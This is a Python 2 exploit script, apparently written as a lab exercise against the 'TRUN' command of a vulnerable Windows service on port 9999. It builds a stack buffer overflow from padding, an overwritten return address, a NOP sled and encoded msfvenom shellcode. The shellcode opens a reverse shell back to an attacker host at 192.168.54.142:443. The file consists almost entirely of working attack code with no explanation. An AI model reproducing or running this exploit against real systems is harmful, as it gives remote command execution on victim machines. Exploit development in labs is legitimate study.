#! /usr/bin/python
import sys, socket
from time import sleep

padding = "A" * 2003

eip = "\xaf\x11\x50\x62" # 0x625011AF1

nopsled = "\x90" * 32

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.54.142 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"
# Payload size: 351 bytes
# Final size of c file: 1500 bytes
shellcode = ("\xbd\xb5\x70\x4e\x3d\xdd\xc3\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x68\x0e\x03\xdd\x7e\xac\xc8\xe1\x97\xb2"
"\x33\x19\x68\xd3\xba\xfc\x59\xd3\xd9\x75\xc9\xe3\xaa\xdb\xe6"
"\x88\xff\xcf\x7d\xfc\xd7\xe0\x36\x4b\x0e\xcf\xc7\xe0\x72\x4e"
"\x44\xfb\xa6\xb0\x75\x34\xbb\xb1\xb2\x29\x36\xe3\x6b\x25\xe5"
"\x13\x1f\x73\x36\x98\x53\x95\x3e\x7d\x23\x94\x6f\xd0\x3f\xcf"
"\xaf\xd3\xec\x7b\xe6\xcb\xf1\x46\xb0\x60\xc1\x3d\x43\xa0\x1b"
"\xbd\xe8\x8d\x93\x4c\xf0\xca\x14\xaf\x87\x22\x67\x52\x90\xf1"
"\x15\x88\x15\xe1\xbe\x5b\x8d\xcd\x3f\x8f\x48\x86\x4c\x64\x1e"
"\xc0\x50\x7b\xf3\x7b\x6c\xf0\xf2\xab\xe4\x42\xd1\x6f\xac\x11"
"\x78\x36\x08\xf7\x85\x28\xf3\xa8\x23\x23\x1e\xbc\x59\x6e\x77"
"\x71\x50\x90\x87\x1d\xe3\xe3\xb5\x82\x5f\x6b\xf6\x4b\x46\x6c"
"\xf9\x61\x3e\xe2\x04\x8a\x3f\x2b\xc3\xde\x6f\x43\xe2\x5e\xe4"
"\x93\x0b\x8b\xab\xc3\xa3\x64\x0c\xb3\x03\xd5\xe4\xd9\x8b\x0a"
"\x14\xe2\x41\x23\xbf\x19\x02\x8c\xe8\x17\x5c\x64\xeb\x57\x61"
"\xce\x62\xb1\x0b\x20\x23\x6a\xa4\xd9\x6e\xe0\x55\x25\xa5\x8d"
"\x56\xad\x4a\x72\x18\x46\x26\x60\xcd\xa6\x7d\xda\x58\xb8\xab"
"\x72\x06\x2b\x30\x82\x41\x50\xef\xd5\x06\xa6\xe6\xb3\xba\x91"
"\x50\xa1\x46\x47\x9a\x61\x9d\xb4\x25\x68\x50\x80\x01\x7a\xac"
"\x09\x0e\x2e\x60\x5c\xd8\x98\xc6\x36\xaa\x72\x91\xe5\x64\x12"
"\x64\xc6\xb6\x64\x69\x03\x41\x88\xd8\xfa\x14\xb7\xd5\x6a\x91"
"\xc0\x0b\x0b\x5e\x1b\x88\x3b\x15\x01\xb9\xd3\xf0\xd0\xfb\xb9"
"\x02\x0f\x3f\xc4\x80\xa5\xc0\x33\x98\xcc\xc5\x78\x1e\x3d\xb4"
"\x11\xcb\x41\x6b\x11\xde")

buffer = padding + eip + nopsled + shellcode

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.141',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()

except:
	print "CRASH!"
	sys.exit()
